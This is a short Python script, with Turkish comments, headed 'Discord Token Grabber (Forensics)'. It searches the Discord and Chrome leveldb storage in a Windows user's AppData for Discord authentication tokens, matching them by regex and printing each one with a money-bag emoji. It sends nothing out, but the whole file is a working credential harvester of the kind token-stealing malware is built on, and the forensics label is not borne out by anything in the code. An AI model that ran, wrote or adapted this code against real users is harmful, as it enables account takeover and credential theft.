import os
import re

print("--- DISCORD TOKEN GRABBER (Forensics) ---")

# Windows AppData yolları
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

paths = {
    'Discord': roaming + '\\Discord',
    'Chrome': local + '\\Google\\Chrome\\User Data\\Default',
}

tokens = []

def find_tokens(path):
    path += '\\Local Storage\\leveldb'
    if not os.path.exists(path): return

    for file_name in os.listdir(path):
        if not file_name.endswith('.ldb') and not file_name.endswith('.log'):
            continue
            
        try:
            with open(f"{path}\\{file_name}", "r", errors='ignore') as file:
                lines = file.readlines()
                for line in lines:
                    # Token Regex Deseni
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in re.findall(regex, line):
                            tokens.append(token)
        except:
            pass

print("Tokenlar aranıyor...")
for source, path in paths.items():
    find_tokens(path)

print(f"\nbulunan Token Sayısı: {len(set(tokens))}")
for t in set(tokens):
    print(f"💰 {t}")
    
if len(tokens) == 0:
    print("Hiç token bulunamadı (veya Discord/Chrome verisi yok).")